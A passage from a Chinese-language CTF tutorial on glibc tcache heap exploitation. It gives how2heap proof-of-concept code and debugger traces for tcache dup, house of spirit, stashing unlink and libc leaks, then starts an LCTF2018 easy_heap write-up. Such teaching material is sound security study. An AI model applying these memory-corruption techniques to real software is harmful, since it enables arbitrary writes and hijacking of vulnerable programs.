06:0030│          0x7fffffffdfd0 ?— 0x0
07:0038│          0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> i r rax
rax            0x7fffffffdfa8	140737488347048
```
可以看出 `tcache posioning` 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。

#### tcache dup
类似 `fastbin dup`，不过利用的是 `tcache_put()` 的不严谨
```C
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
可以看出，`tcache_put()` 的检查也可以忽略不计（甚至没有对 `tcache->counts[tc_idx]` 的检查），大幅提高性能的同时安全性也下降了很多。

因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。

以 how2heap 的 [tcache_dup](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c) 为例分析，源码如下：
```C
glibc_2.26 [master●] bat ./tcache_dup.c 
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: ./tcache_dup.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ 
   4   │ int main()
   5   │ {
   6   │         fprintf(stderr, "This file demonstrates a simple double-free attack with
       │  tcache.\n");
   7   │ 
   8   │         fprintf(stderr, "Allocating buffer.\n");
   9   │         int *a = malloc(8);
  10   │ 
  11   │         fprintf(stderr, "malloc(8): %p\n", a);
  12   │         fprintf(stderr, "Freeing twice...\n");
  13   │         free(a);
  14   │         free(a);
  15   │ 
  16   │         fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
  17   │         fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", ma
       │ lloc(8), malloc(8));
  18   │ 
  19   │         return 0;
  20   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

调试一下，第一次 free
```asm
pwndbg> n
14		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x1
 R8   0x0
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x5555555547fc (main+162) ?— mov    rax, qword ptr [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547e4 <main+138>    lea    rdi, [rip + 0x171]
   0x5555555547eb <main+145>    call   fwrite@plt <0x555555554630>
 
   0x5555555547f0 <main+150>    mov    rax, qword ptr [rbp - 0x18]
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
 ? 0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
   0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
    9 	int *a = malloc(8);
   10 
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
 ? 14 	free(a);
   15 
   16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260
```
tcache 的第一条链放入了一个 chunk

第二次 free 时，虽然 free 的是同一个 chunk，但因为 `tcache_put()` 没有做任何检查，因此程序不会 crash
```asm
pwndbg> n
16		fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x555555756260 ?— 0x555555756260 /* '`buUUU' */
 RDI  0x2
 RSI  0x555555756010 ?— 0x2
 R8   0x1
 R9   0x7fffffffb79c ?— 0x1a00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0b0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
 RIP  0x555555554808 (main+174) ?— mov    rax, qword ptr [rip + 0x200851]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555547f4 <main+154>    mov    rdi, rax
   0x5555555547f7 <main+157>    call   free@plt <0x555555554600>
 
   0x5555555547fc <main+162>    mov    rax, qword ptr [rbp - 0x18]
   0x555555554800 <main+166>    mov    rdi, rax
   0x555555554803 <main+169>    call   free@plt <0x555555554600>
 
 ? 0x555555554808 <main+174>    mov    rax, qword ptr [rip + 0x200851] <0x555555755060>
   0x55555555480f <main+181>    mov    rcx, qword ptr [rbp - 0x18]
   0x555555554813 <main+185>    mov    rdx, qword ptr [rbp - 0x18]
   0x555555554817 <main+189>    lea    rsi, [rip + 0x152]
   0x55555555481e <main+196>    mov    rdi, rax
   0x555555554821 <main+199>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   11 	fprintf(stderr, "malloc(8): %p\n", a);
   12 	fprintf(stderr, "Freeing twice...\n");
   13 	free(a);
   14 	free(a);
   15 
 ? 16 	fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
   17 	fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));
   18 
   19 	return 0;
   20 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfb0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x555555756260 /* '`buUUU' */
02:0010│      0x7fffffffdfc0 —? 0x7fffffffe0b0 ?— 0x1
03:0018│      0x7fffffffdfc8 ?— 0x0
04:0020│ rbp  0x7fffffffdfd0 —? 0x555555554870 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfd8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfe0 ?— 0x0
07:0038│      0x7fffffffdfe8 —? 0x7fffffffe0b8 —? 0x7fffffffe3d8 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555756270 (size : 0x20d90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x555555756260 --> 0x555555756260 (overlap chunk with 0x555555756250(freed) )
```
可以看出，这种方法与 `fastbin dup` 相比也简单了很多。

#### tcache perthread corruption
我们已经知道 `tcache_perthread_struct` 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。

这里没找到太好的例子，自己想了一种情况

设想有如下的堆排布情况
```
tcache_    +------------+
\perthread |......      |
\_struct   +------------+
           |counts[i]   |
           +------------+
           |......      |          +----------+
           +------------+          |header    |
           |entries[i]  |--------->+----------+
           +------------+          |NULL      |
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
通过一些手段（如 `tcache posioning`），我们将其改为了
```
tcache_    +------------+<---------------------------+
\perthread |......      |                            |
\_struct   +------------+                            |
           |counts[i]   |                            |
           +------------+                            |
           |......      |          +----------+      |
           +------------+          |header    |      |
           |entries[i]  |--------->+----------+      |
           +------------+          |target    |------+
           |......      |          +----------+
           |            |          |          |
           +------------+          +----------+
```
这样，两次 malloc 后我们就返回了 `tcache_perthread_struct` 的地址，就可以控制整个 tcache 了。

**因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。**



#### tcache house of spirit

拿 how2heap 的源码来讲：

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
	fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
	fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
	fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

	fprintf(stderr, "Ok. Let's start with the example!.\n\n");


	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region

	fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

	fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size


	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```



攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的chunk，然后去 free 掉他，我们会发现

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x4052e0 (size : 0x20d20)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffe510 --> 0x401340
```



Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。

#### smallbin unlink

在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。

#### tcache stashing unlink attack

这种攻击利用的是 tcache bin 有剩余(数量小于 `TCACHE_MAX_BINS` )时，同大小的small bin会放进tcache中(这种情况可以用  `calloc` 分配同大小堆块触发，因为 `calloc` 分配堆块时不从 tcache bin 中选取)。在获取到一个 `smallbin` 中的一个chunk后会如果 tcache 仍有足够空闲位置，会将剩余的 small bin 链入 tcache ，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失。当攻击者可以写一个small bin的bk指针时，其可以在任意地址上写一个libc地址(类似 `unsorted bin attack` 的效果)。构造得当的情况下也可以分配 fake chunk 到任意地址。

这里以 `how2heap` 中的 `tcache_stashing_unlink_attack.c` 为例。

我们按照释放的先后顺序称 `smallbin[sz]` 中的两个 chunk 分别为 chunk0 和 chunk1。我们修改 chunk1 的 `bk` 为 `fake_chunk_addr`。同时还要在 `fake_chunk_addr->bk` 处提前写一个可写地址 `writable_addr` 。调用 `calloc(size-0x10)` 的时候会返回给用户 chunk0 (这是因为 smallbin 的 `FIFO` 分配机制)，假设 `tcache[sz]` 中有 5 个空闲堆块，则有足够的位置容纳 `chunk1` 以及 `fake_chunk` 。在源码的检查中，只对第一个 chunk 的链表完整性做了检测 `__glibc_unlikely (bck->fd != victim)` ，后续堆块在放入过程中并没有检测。

因为tcache的分配机制是 `LIFO` ，所以位于 `fake_chunk->bk` 指针处的 `fake_chunk` 在链入 tcache 的时候反而会放到链表表头。在下一次调用 `malloc(sz-0x10)` 时会返回 `fake_chunk+0x10` 给用户，同时，由于 `bin->bk = bck;bck->fd = bin;` 的unlink操作，会使得 `writable_addr+0x10` 处被写入一个 libc 地址。

```c

#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    fprintf(stderr, "This file demonstrates the stashing unlink attack on tcache.\n\n");
    fprintf(stderr, "This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n");
    fprintf(stderr, "This technique can be used when you are able to overwrite the victim->bk pointer. Besides, it's necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n");
    fprintf(stderr, "The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n");
    fprintf(stderr, "This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we'll create the chunk on the stack.\n\n");

    // stack_var emulate the fake_chunk we want to alloc to
    fprintf(stderr, "Stack_var emulates the fake chunk we want to alloc to.\n\n");
    fprintf(stderr, "First let's write a writeable address to fake_chunk->bk to bypass bck->fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk->bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n");

    stack_var[3] = (unsigned long)(&stack_var[2]);

    fprintf(stderr, "You can see the value of fake_chunk->bk is:%p\n\n",(void*)stack_var[3]);
    fprintf(stderr, "Also, let's see the initial value of stack_var[4]:%p\n\n",(void*)stack_var[4]);
    fprintf(stderr, "Now we alloc 9 chunks with malloc.\n\n");

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 tcache
    fprintf(stderr, "Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    fprintf(stderr, "As you can see, chunk1 & [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n");

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    fprintf(stderr, "Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n");

    malloc(0xa0);//>0x90

    //now 5 tcache bins
    fprintf(stderr, "Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n");

    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n",(void*)stack_var);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
    fprintf(stderr, "Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n");

    calloc(1,0x90);

    fprintf(stderr, "Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr: %p\n\n",(void*)stack_var[2],(void*)stack_var[4]);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    fprintf(stderr, "As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);
    return 0;
}
```

这个 poc 用栈上的一个数组上模拟 `fake_chunk` 。首先构造出5个 `tcache chunk` 和2个 `smallbin chunk` 的情况。模拟 `UAF` 漏洞修改 `bin2->bk` 为 `fake_chunk` ，在 `calloc(0x90)` 的时候触发攻击。

我们在 `calloc` 处下断点，调用前查看堆块排布情况。此时 `tcache[0xa0]` 中有 5 个空闲块。可以看到 chunk1->bk 已经被改为了 `fake_chunk_addr` 。而 `fake_chunk->bk` 也写上了一个可写地址。由于 `smallbin` 是按照 `bk` 指针寻块的，分配得到的顺序应当是 `0x0000000000603250->0x0000000000603390->0x00007fffffffdbc0 (FIFO)` 。调用 calloc 会返回给用户 `0x0000000000603250+0x10`。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](5): 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x603390
0x603390:       0x0000000000000000      0x00000000000000a1
0x6033a0:       0x0000000000603250      0x00007fffffffdbc0
gdb-peda$ x/4gx 0x00007fffffffdbc0
0x7fffffffdbc0: 0x0000000000000000      0x0000000000000000
0x7fffffffdbd0: 0x0000000000000000      0x00007fffffffdbd0
gdb-peda$ x/4gx 0x0000000000603250
0x603250:       0x0000000000000000      0x00000000000000a1
0x603260:       0x00007ffff7dcfd30      0x0000000000603390
gdb-peda$ x/4gx 0x00007ffff7dcfd30
0x7ffff7dcfd30 <main_arena+240>:        0x00007ffff7dcfd20      0x00007ffff7dcfd20
0x7ffff7dcfd40 <main_arena+256>:        0x0000000000603390      0x0000000000603250
```

调用 calloc 后再查看堆块排布情况，可以看到 `fake_chunk` 已经被链入 `tcache_entry[8]` ,且因为分配顺序变成了 `LIFO` , `0x7fffffffdbd0-0x10` 这个块被提到了链表头，下次 `malloc(0x90)` 即可获得这个块。

其 fd 指向下一个空闲块，在 unlink 过程中 `bck->fd=bin` 的赋值操作使得 `0x00007fffffffdbd0+0x10` 处写入了一个 libc 地址。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x6038a0 (size : 0x20760) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x0a0)  smallbin[ 8]: 0x603390 (doubly linked list corruption 0x603390 != 0x6033a0 and 0x603390 is broken)
(0xa0)   tcache_entry[8](7): 0x7fffffffdbd0 --> 0x6033a0 --> 0x6036c0 --> 0x603620 --> 0x603580 --> 0x6034e0 --> 0x603440
gdb-peda$ x/4gx 0x7fffffffdbd0
0x7fffffffdbd0: 0x00000000006033a0      0x00007fffffffdbd0
0x7fffffffdbe0: 0x00007ffff7dcfd30      0x0000000000000000
```

####  libc leak

在以前的libc 版本中，我们只需这样：

```c
#include <stdlib.h>
#include <stdio.h>

int main()
{
	long *a = malloc(0x1000);
	malloc(0x10);
	free(a);
	printf("%p\n",a[0]);
} 
```



但是在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：

```c
#include <stdlib.h>
#include <stdio.h>

int main(int argc , char* argv[])
{
	long* t[7];
	long *a=malloc(0x100);
	long *b=malloc(0x10);
	
	// make tcache bin full
	for(int i=0;i<7;i++)
		t[i]=malloc(0x100);
	for(int i=0;i<7;i++)
		free(t[i]);
	
	free(a);
	// a is put in an unsorted bin because the tcache bin of this size is full
	printf("%p\n",a[0]);
} 
```

之后，我们就可以 leak libc 了。

```bash
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x555555559af0 (size : 0x20510)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x555555559250 (size : 0x110)
(0x110)   tcache_entry[15]: 0x5555555599f0 --> 0x5555555598e0 --> 0x5555555597d0 --> 0x5555555596c0 --> 0x5555555595b0 --> 0x5555555594a0 --> 0x555555559390
gdb-peda$ parseheap
addr                prev                size                 status              fd                bk
0x555555559000      0x0                 0x250                Used                None              None
0x555555559250      0x0                 0x110                Freed     0x7ffff7fc0ca0    0x7ffff7fc0ca0
0x555555559360      0x110               0x20                 Used                None              None
0x555555559380      0x0                 0x110                Used                None              None
0x555555559490      0x0                 0x110                Used                None              None
0x5555555595a0      0x0                 0x110                Used                None              None
0x5555555596b0      0x0                 0x110                Used                None              None
```



### 0x04 Tcache Check

在最新的 libc 的[commit](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=f730d7a2ee496d365bf3546298b9d19b8bddc0d0;hp=6d7a6a8cabb4edbf00881cb7503473a8ed4ec0b7;hb=bcdaad21d4635931d1bd3b54a7894276925d081d;hpb=5770c0ad1e0c784e817464ca2cf9436a58c9beb7) 中更新了 Tcache 的 double free 的check：

```c
index 6d7a6a8..f730d7a 100644 (file)
--- a/malloc/malloc.c
+++ b/malloc/malloc.c
@@ -2967,6 +2967,8 @@ mremap_chunk (mchunkptr p, size_t new_size)
 typedef struct tcache_entry
 {
   struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  struct tcache_perthread_struct *key;
 } tcache_entry;
 
 /* There is one of these for each thread, which contains the
@@ -2990,6 +2992,11 @@ tcache_put (mchunkptr chunk, size_t tc_idx)
 {
   tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
   assert (tc_idx < TCACHE_MAX_BINS);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache;
+
   e->next = tcache->entries[tc_idx];
   tcache->entries[tc_idx] = e;
   ++(tcache->counts[tc_idx]);
@@ -3005,6 +3012,7 @@ tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }
 
@@ -4218,6 +4226,26 @@ _int_free (mstate av, mchunkptr p, int have_lock)
   {
     size_t tc_idx = csize2tidx (size);
 
+    /* Check to see if it's already in the tcache.  */
+    tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+    /* This test succeeds on double free.  However, we don't 100%
+       trust it (it also matches random payload data at a 1 in
+       2^<size_t> chance), so verify it's not an unlikely coincidence
+       before aborting.  */
+    if (__glibc_unlikely (e->key == tcache && tcache))
+      {
+       tcache_entry *tmp;
+       LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+       for (tmp = tcache->entries[tc_idx];
+            tmp;
+            tmp = tmp->next)
+         if (tmp == e)
+           malloc_printerr ("free(): double free detected in tcache 2");
+       /* If we get here, it was a coincidence.  We've wasted a few
+          cycles, but don't abort.  */
+      }
+
     if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
```



目前为止，只看到了在 free 操作的时候的 check ，似乎没有对 get 进行新的check。

### 0x05 The pwn of CTF

#### Challenge 1 : LCTF2018 PWN easy_heap

##### 基本信息

远程环境中的 libc 是 libc-2.27.so ，所以堆块申请释放过程中需要考虑 Tcache 。

```shell
zj@zj-virtual-machine:~/c_study/lctf2018/easy$ checksec ./easy_heap
[*] '/home/zj/c_study/lctf2018/easy/easy_heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

##### 基本功能

0. 输入函数：循环读入一个字节，如果出现 null 字节或是换行符则停止读入，之后对当前读入的末尾位置和 size 位置进行置零操作。
1. new: 使用 `malloc(0xa8)` 分配一个块，记录下 size ，输入内容。
2. free: 首先根据记录下的 size 对堆块进行 `memset` 清零，之后进行常规 free
3. show：使用 puts 进行输出

功能较为简单。

记录一个 chunk 结构的结构体：

```c
struct Chunk {
    char *content;
    int size;
};
```

使用了一个在堆上分配的结构来记录所有 `Chunk` 结构体，一共可以分配 10 个块。

程序的读入输入函数存在一个 null-byte-overflow 漏洞 ，具体见如下代码

```c
unsigned __int64 __fastcall read_input(_BYTE *malloc_p, int sz)
{
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  i = 0;                                        
  if ( sz )
  {
    while ( 1 )
    {
      read(0, &malloc_p[i], 1uLL);
      if ( sz - 1 < i || !malloc_p[i] || malloc_p[i] == '\n' )
        break;
      ++i;
    }
    malloc_p[i] = 0;
    malloc_p[sz] = 0;                           // null-byte-overflow
  }
  else
  {
    *malloc_p = 0;
  }
  return __readfsqword(0x28u) ^ v4;
}
```

##### 利用思路

由于存在 tcache ，所以利用过程中需要考虑到 tcache 的存在。

通常来讲在堆程序中出现 null-byte-overflow 漏洞 ，都会考虑构造 overlapping heap chunk ，使得 overlapping chunk 可以多次使用 ，达到信息泄露最终劫持控制流的目的 。

null-byte-overflow 漏洞的利用方法通过溢出覆盖 prev_in_use 字节使得堆块进行合并，然后使用伪造的 prev_size 字段使得合并时造成堆块交叉。但是本题由于输入函数无法输入 NULL 字符，所以无法输入 prev_size 为 0x_00 的值，而堆块分配大小是固定的，所以直接采用 null-byte-overflow 的方法无法进行利用，需要其他方法写入 prev_size 。

在没有办法手动写入 prev_size ，但又必须使用 prev_size 才可以进行利用的情况下，考虑使用系统写入的 prev_size 。

方法为：在 unsorted bin 合并时会写入 prev_size，而该 prev_size 不会被轻易覆盖（除非有新的 prev_size 需要写入），所以可以利用该 prev_size 进行利用。

具体过程：

1. 将 `A -> B -> C` 三块 unsorted bin chunk 依次进行释放
2. A 和 B 合并，此时 C 前的 prev_size 写入为 0x200
3. A  、 B  、 C 合并，步骤 2 中写入的 0x200 依然保持
4. 利用 unsorted bin 切分，分配出 A 
5. 利用 unsorted bin 切分，分配出 B，注意此时不要覆盖到之前的 0x200
6. 将 A 再次释放为 unsorted bin 的堆块，使得 fd 和 bk 为有效链表指针
7. 此时 C 前的 prev_size 依然为 0x200（未使用到的值），A B C 的情况： `A (free) -> B (allocated) -> C (free)`，如果使得 B 进行溢出，则可以将已分配的 B 块包含在合并后的释放状态 unsorted bin 块中。

但是在这个过程中需要注意 tcache 的影响。

##### 利用步骤

###### 重排堆块结构，释放出 unsorted bin chunk

由于本题只有 10 个可分配块数量，而整个过程中我们需要用到 3 个 unsorted bin 的 chunk ，加上 7 个 tcache 的 chunk ，所以需要进行一下重排，将一个 tcache 的 chunk 放到 3 个 unsorted bin chunk 和 top chunk 之间，否则会触发 top 的合并。

```python
    # step 1: get three unsortedbin chunks
